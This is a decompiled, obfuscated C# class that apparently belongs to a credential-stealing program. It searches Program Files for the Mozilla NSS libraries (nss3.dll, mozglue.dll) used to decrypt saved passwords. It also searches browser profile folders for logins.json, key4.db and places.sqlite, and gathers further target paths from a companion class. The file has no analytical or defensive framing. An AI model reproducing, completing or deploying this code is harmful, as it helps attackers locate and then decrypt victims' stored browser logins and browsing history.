using System;
using System.Collections.Generic;
using System.IO;

internal class Class53
{
	private static string[] smethod_0(string[] string_0, string[] string_1)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException("x");
		}
		if (string_1 == null)
		{
			throw new ArgumentNullException("y");
		}
		int destinationIndex = string_0.Length;
		Array.Resize(ref string_0, string_0.Length + string_1.Length);
		Array.Copy(string_1, 0, string_0, destinationIndex, string_1.Length);
		return string_0;
	}

	private static string[] smethod_1()
	{
		string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
		if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
		{
			array = smethod_0(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
		}
		return array;
	}

	public static string smethod_2(string string_0)
	{
		try
		{
			string path = Path.Combine(string_0, "Profiles");
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite"))
					{
						return text;
					}
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Failed to find profile\n" + ex);
		}
		return null;
	}

	public static string smethod_3()
	{
		string[] array = smethod_1();
		int num = 0;
		string text;
		while (true)
		{
			if (num < array.Length)
			{
				text = array[num];
				if (File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll"))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return text;
	}

	public static string[] smethod_4()
	{
		List<string> list = new List<string>();
		string[] string_ = Class52.string_1;
		foreach (string path in string_)
		{
			string text = Path.Combine(Class52.string_3, path);
			if (Directory.Exists(text))
			{
				list.Add(text);
			}
		}
		return list.ToArray();
	}
}
